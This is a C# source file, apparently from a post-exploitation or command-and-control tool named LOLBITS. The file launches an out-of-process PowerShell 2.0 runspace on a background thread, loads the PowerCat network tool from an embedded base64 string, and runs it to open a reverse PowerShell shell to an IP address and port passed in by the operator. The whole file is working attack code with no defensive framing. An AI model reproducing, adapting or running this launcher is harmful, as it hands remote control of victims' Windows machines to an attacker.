using System;
using System.Management.Automation.Runspaces;
using System.Threading;

namespace LOLBITS.Controlling
{
    public class LauncherPowershell
    {
        public static void Main(string ip, string port)
        {
            var obj = new LauncherPowershell();

            var thr1 = new Thread(ExecutePowershell);

            var a = new object[] {ip, port };
            thr1.Start(a);
        }

        private static void ExecutePowershell(object args)
        {
            var a = (object[])args;
            var ip = (string)a[0];
            var port = (string)a[1];
            var instance = new PowerShellProcessInstance(new Version(2, 0), null, null, false);
            
            using (var rs = RunspaceFactory.CreateOutOfProcessRunspace(new TypeTable(new string[0]), instance))
            {
                rs.Open();

                var pipeline = rs.CreatePipeline();
                pipeline.Commands.AddScript(PowerCat.PowerCatBase64());
                pipeline.Commands.AddScript("powercat -c " + ip + "  " + port + " -ep");
                pipeline.Invoke();
            }
        }
    }
}